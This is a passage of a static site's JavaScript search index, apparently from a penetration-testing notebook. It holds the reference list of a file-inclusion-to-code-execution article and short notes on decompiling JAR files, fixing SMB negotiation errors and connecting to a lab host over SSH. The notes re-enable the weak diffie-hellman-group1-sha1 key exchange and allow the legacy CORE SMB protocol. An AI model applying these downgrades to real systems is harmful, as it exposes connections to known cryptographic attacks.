‘\\UNC\\share\\name\\’ (Windows UNC Share) (4.1).” CWE - Common Weakness Enumeration, https://cwe.mitre.org/data/definitions/40.html. \u0026#x21a9;\u0026#xfe0e;\n “PHP: Supported Protocols and Wrappers - Manual.” PHP: Hypertext Preprocessor, https://www.php.net/manual/en/wrappers.php. \u0026#x21a9;\u0026#xfe0e;\n “RFC 2397 - The ‘Data’ URL Scheme.” IETF Tools, https://tools.ietf.org/html/rfc2397. \u0026#x21a9;\u0026#xfe0e;\n “The /Proc Filesystem.” The Linux Kernel Documentation, https://www.kernel.org/doc/html/latest/filesystems/proc.html. \u0026#x21a9;\u0026#xfe0e;\n “Proc(5) - Linux Manual Page.” Michael Kerrisk - Man7.Org, https://man7.org/linux/man-pages/man5/proc.5.html. \u0026#x21a9;\u0026#xfe0e;\n Bernat, Vincent. “IPv4 Route Lookup on Linux ⁕ Vincent Bernat.” MTU Ninja Vincent Bernat, https://vincent.bernat.ch/en/blog/2017-ipv4-route-lookup-linux. \u0026#x21a9;\u0026#xfe0e;\n “LFI2RCE (Local File Inclusion to Remote Code Execution) Advanced Exploitation: /Proc Shortcuts.” Ush.It - a Beautiful Place, https://www.ush.it/2008/08/18/lfi2rce-local-file-inclusion-to-remote-code-execution-advanced-exploitation-proc-shortcuts/. \u0026#x21a9;\u0026#xfe0e;\n “Log Files - Apache HTTP Server Version 2.4.” Welcome! - The Apache HTTP Server Project, https://httpd.apache.org/docs/2.4/logs.html. \u0026#x21a9;\u0026#xfe0e;\n   "});index.add({'id':19,'href':'/book/notes/how-to-open-jar-files/','title':"How to Open JAR files",'section':"Notes",'content':"How to Open JAR Files A JAR (Java ARchive) file is a package file format, based on the ZIP file format, used to aggregate many Java class files, metadata and resources (text, images, etc.) into one file for distribution.1\nThe contents of a JAR file can be extracted using any standard decompression tool, or the jar command line utility.\nunzip unzip -d foo foo.jar   Parameters   -d \u0026lt;dir\u0026gt;: extract files into dir.   jar jar -xf foo.jar   Parameters   -x: extract named (or all) files from archive. -f \u0026lt;file\u0026gt;: specify archive file name.   Decompile Class Files Java class files are compiled files containing Java bytecode that can be executed by a Java Virtual Machine (JVM). To decompile and view the source code in plain text any Java decompiler can be used.\nJAD was the go-to for many years but only supports Java 1.4 or below. The Java-Decompiler Project, Procyon, and online tools like DevToolZone\u0026rsquo;s Java Decompiler are good alternatives.\nprocyon procyon foo.class   “JAR File Specification.” JAVA SE Documentation, https://docs.oracle.com/javase/6/docs/technotes/guides/jar/jar.html#JARIndex. \u0026#x21a9;\u0026#xfe0e;\n   "});index.add({'id':20,'href':'/book/notes/smb-protocol-negotiation-failed/','title':"SMB Protocol Negotiation Failed",'section':"Notes",'content':"SMB Protocol Negotiation Failed Normally SMB takes care of choosing the appropriate protocol for each connection. However, if the offered protocols are out of client\u0026rsquo;s default range, it will return an error message like this:\nProtocol negotiation failed: NT_STATUS_IO_TIMEOUT Solution Edit the connection protocol range in the client configuration file.\nAdd client min protocol and client max protocol settings to /etc/samba/smb.conf under [global].\n# /etc/samba/smb.conf [global] client min protocol = CORE client max protocol = SMB3 "});index.add({'id':21,'href':'/book/notes/ssh-legacy-key-exchange/','title':"SSH Legacy Key Exchange",'section':"Notes",'content':"SSH Legacy Key Exchange Algorithm1 When an SSH client connects to a server, each side offers sets of connection parameters to the other. For a successful connection, there must be at least one mutually compatible set for each parameter.\nIf the client and the server cannot agree on a mutual set, in this case, the key exchange algorithm, the connection will fail and OpenSSH will return an error message like this:\nUnable to negotiate with 10.10.10.7 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 The server offered diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1. OpenSSH supports these methods but does not enable it by default because is weak and within the theoretical range of the so-called Logjam attack.\nMore about the Logjam attack in Imperfect Forward Secrecy:How Diffie-Hellman Fails in Practice.\nSolution If upgrading is not immediately possible you can re-enable the algorithms either on the command-line:\nssh -oKexAlgorithms=+diffie-hellman-group1-sha1 root@10.10.10.7 or in the ~/.ssh/config file:\nHost 10.10.10.7 KexAlgorithms +diffie-hellman-group1-sha1   “OpenSSH: Legacy Options.” OpenSSH, https://www.openssh.com/legacy.html. \u0026#x21a9;\u0026#xfe0e;\n   "});})();